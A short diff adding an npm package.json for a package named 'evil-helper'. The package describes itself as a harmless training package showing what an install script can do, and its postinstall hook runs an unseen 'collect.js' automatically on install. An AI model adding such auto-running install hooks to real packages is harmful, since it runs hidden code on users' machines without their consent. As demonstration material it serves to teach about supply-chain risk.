@@ -1,0 +1,10 @@
+{
+  "name": "evil-helper",
+  "version": "1.2.3",
+  "description": "A harmless training package that shows what an install script can do.",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node collect.js"
+  },
+  "license": "MIT"
+}
